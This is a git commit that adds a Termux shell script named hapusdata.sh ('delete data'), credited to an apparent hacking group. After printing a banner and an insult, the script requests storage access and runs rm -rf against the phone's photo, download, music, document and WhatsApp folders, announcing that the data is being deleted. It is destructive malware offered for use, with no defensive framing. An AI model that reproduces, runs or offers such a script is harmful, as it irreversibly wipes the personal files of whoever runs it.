dfa345637c128d72e1bf1f2f76034de512d279d5
MRSUB75-CYBER <84297097+MRSUB75-CYBER@users.noreply.github.com>
2021-05-26 12:14:41 +0700

    Add files via upload

---
+++ hapusdata.sh
@@ -0,0 +1,24 @@
+
+clear
+figlet -f slant "MR•SUB75"
+echo
+    echo "AUTHOR  :MR•SUB75 CYBER"
+    echo "TEAM    :SQUAD.TEAM.DRAGON.VIRUS"
+    echo "PESAN   :JANGAN SOK KERAS ANJING"
+sleep2
+echo
+    echo "SEDANG MENGHAPUS DATA"
+termux-setup-storage
+sleep1
+      rm -rf cd /sdcard/android
+      rm -rf cd /sdcard/DCIM
+      rm -rf cd /sdcard/documents
+      rm -rf cd /sdcard/Download
+      rm -rf cd /sdcard/Movies
+      rm -rf cd /sdcard/Music
+      rm -rf cd /sdcard/Pictures
+      rm -rf cd /sdcard/WhatsApp
+      rm -rf cd /sdcard/WhatsApp Business
+echo "TUNGGU 5 DETIK"
+     sleep5
+echo "MENGHAPUS DATA SELESAI"
